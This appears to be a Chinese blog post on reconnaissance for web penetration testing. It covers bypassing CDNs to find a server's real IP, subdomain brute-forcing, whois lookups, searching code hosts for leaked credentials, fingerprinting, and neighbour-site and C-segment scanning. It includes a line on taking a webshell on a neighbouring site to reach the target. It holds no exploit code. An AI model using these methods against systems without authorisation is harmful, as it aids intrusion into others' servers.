信息收集的方式可以分为两种：主动和被动。主动信息收集：通过直接访问、扫描网站，这种流量将流经网站被动信息收集：利用第三方的服务对目标进行访问了解，比例：Google搜索、Shodan搜索等.Google Hacking的用法:https://blog.csdn.net/qq_36119192/article/details/84029809Shodan的基本使用:https://blog.csdn.net/qq_36119192/article/details/84031765 #域名信息的收集 当我们确定了要渗透的目标，也就是知道了其域名，接下来我们需要收集域名对应的 ip，域名的whois信息、子域名等等一系列与域名相关的信息。 判断域名对应的IP：首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：http://ping.chinaz.com/ 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了。那么如何绕过CDN查找网站真实的ip地址呢？ 在渗透测试过程中，经常会碰到网站有CDN的情况。CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说的简单点，就是一组在不同运营商之间的对接点上的高速缓存服务器，把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。 如何判断网站是否有CDN？ 很简单，使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了CDN #绕过CDN查找网站真实ip (1)查询子域名：毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。 查询子域名有三种方法： 1、通过爆破子域名进行查询，如 Layer子域名爆破机、subDomainBrute，在线子域名查询网站：https://phpinfo.me/domain/ 2、通过查询DNS服务器，查询该域下的解析记录 3、通过HTTPS证书来查询(只适用于https网站) ，如：https://crt.sh/ 就是通过https证书查询子域名 4、通过google查询 （1）Layer子域名爆破机 Layer是windows下的一款子域名探测工具，其工作原理是利用子域名字典进行爆破，使用简单容易上手。 （2）subDomainBrute subDomainBrute的特点是可以用小字典递归的发现三级域名、四级域名、甚至五级域名等不容易被探测到的域名。 字典较为丰富，小字典就包括1万5千条，大字典多达6万3千条 默认使用114DNS、百度DNS、阿里DNS这几个快速又可靠的Public DNS查询，可修改配置文件添加DNS服务器（在dict里面可以进行添加） 自动去重泛解析的域名，当前规则： 超过2个域名指向同一IP，则此后发现的其他指向该IP的域名将被丢弃 我这里就是使用的subDomainBrute： 因为字典很大，所以速度有点慢 （3）利用google查询 指定站点，然后-就是不包含这个，来查询 site:baidu.com -www (2)查询主域名：以前用CDN的时候有个习惯，只让WWW域名使用cdn，秃域名不适用，为的是在维护网站时更方便，不用等cdn缓存。所以试着把目标网站的www去掉，ping一下看ip是不是变了。 (3)邮件服务器：一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)。 (4)查看域名历史解析记录：也许目标很久之前没有使用CDN，所以可能会存在使用 CDN 前的记录。所以可以通过网站https://www.netcraft.com 来观察域名的IP历史记录。 (5)国外访问：国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站https://asm.ca.com/en/ping.php 访问 ，可能会得到真实的ip地址。 (6)Nslookup查询：查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。传送门：各种解析记录 (7)网站漏洞：利用网站自身存在的漏洞，很多情况下会泄露服务器的真实IP地址 (8)Censys查询SSL证书找到真实IP：利用“Censys网络空间搜索引擎”搜索网站的SSL证书及HASH，在https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址。 绕过CDN查找网站真实ip部分结束 域名的whois信息：whois是用来查询域名注册所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令行接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。 通常，我们进行whois查询是去： 站长之家whois查询 。然后查出来信息之后，可以根据查询出来的邮箱、注册人、公司、电话等进行反查。http://whois.chinaz.com #公司敏感信息网上搜集 当确定了公司后，我们可以去互联网上查询与该公司有关的任何信息。比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。Github搜索语法：https://blog.csdn.net/qq_36119192/article/details/99690742 #网站指纹识别 在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。 常见的网站指纹识别工具有：whatweb等。 在线指纹识别网站： BugScaner：http://whatweb.bugscaner.com/look/云悉指纹：http://www.yunsee.cn/finger.htmlWhatWeb：https://whatweb.net/ #整站分析 服务器类型(Linux/Windows) 服务器信息包括服务器用的操作系统：Linux 还是 Windows 。现在企业网站服务器的操作系统有百分之九十以上用的是Linux操作系统。知道了服务器的操作系统之后，还需要知道操作系统使用的具体版本。因为很多低版本的操作系统都存在已知的漏洞。 判断是Linux还是Windows最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。但是，通过TTL值来判断服务器类型也不是百分之百准确的，有些windows服务器的TTL值也是几十，而且有的服务器禁止ping。 ping一下自己的网站试试，结果正确。 tips：看到个评论不知道对不对，暂且先记着：分享一个操作系统的简单区别方式，Linux系统对大小写敏感，Windows不敏感。所以我们在访问的时候可以尝试把路径部分改成大写，然后去访问，看能否请求成功。Linux系统会找不到文件的，Windows可以找到，因为对大小写不敏感. 而判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来 网站容器(Apache/Nginx/Tomcat/IIS) 知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。 脚本类型(php/jsp/asp/aspx) 我们需要知道网站用的脚本类型：php 、Jsp 、Asp 、Aspx 。1：可以根据网站URL来判断2：site:xxx filetype:php3：可以根据Firefox的插件来判断 数据库类型(Mysql/Oracle/Accees/Mqlserver) 我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的 几种数据库的区别： Access 全名是Microsoft Office Access，是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名： .mdb 一般是asp的网页文件用access数据库 SQL Server是由Microsoft开发和推广的关系数据库管理系统（DBMS），是一个比较大型的数据库。端口号为1433。数据库后缀名 .mdf MySQL 是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL是最流行的关系型数据库管理系统，在 WEB 应用方面MySQL是最好的应用软件之一，MySQL数据库大部分是php的页面。默认端口是3306 Oracle又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。常用于比较大的网站。默认端口是1521 首先，成本上的差距，access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。其次，处理能力，access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访 问。再次，从数据库的规模来看，access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。 常见搭配： ASP 和 ASPX：ACCESS、SQL Server PHP：MySQL、PostgreSQL JSP：Oracle、MySQL #主机扫描(Nessus) 对目标主机进行扫描，而不仅仅是对网站进行扫描，扫描目标主机开放了哪些端口，扫描端口运行的服务，目标主机上有哪些漏洞。 主机扫描的工具也有很多，比如：Nessus #端口扫描(nmap) 上面演示过了，这里就跳过了。Nmap使用详解：https://blog.csdn.net/qq_36119192/article/details/82079150常见危险端口及漏洞利用：https://blog.csdn.net/qq_36119192/article/details/84781477?ops_request_misc=%7B%22request_id%22%3A%22158176934719725219927367%22%2C%22scm%22%3A%2220140713.130056874..%22%7D&amp;request_id=158176934719725219927367&amp;biz_id=0&amp;utm_source=distribute.pc_search_result.none-task #网站敏感目录和文件不知道平时打CTF的dirsearch能不能用。。。 #旁站和C段扫描 旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了！ 对于红蓝对抗和护网，C段扫描比较有意义。对于单独网站的渗透测试，C段扫描意义不大。C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。 旁站和C段在线查询地址： http://www.webscan.cc/https://phpinfo.me/bing.php 网站漏洞扫描 网站漏洞扫描就是直接对网站进行漏洞探测了。网站漏洞扫描也有很多工具。比如 AWVS、AppScan、OWASP-ZAP、nessuss等等。但是需要注意的是，使用漏扫工具直接对网站进行扫描，因为一下子流量过大，有些网站可能会崩溃。所以一般最好不要使用漏洞扫描工具对网站进行扫描。并且如果未经授权就用漏扫对网站进行扫描还是违法的！ AWVS:https://blog.csdn.net/qq_36119192/article/details/83187475AppScan:https://blog.csdn.net/qq_36119192/article/details/83187475 下一篇博客找个小网站实战一下上述的内容。 参考链接：https://blog.csdn.net/qq_36119192/article/details/84674109","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]}]}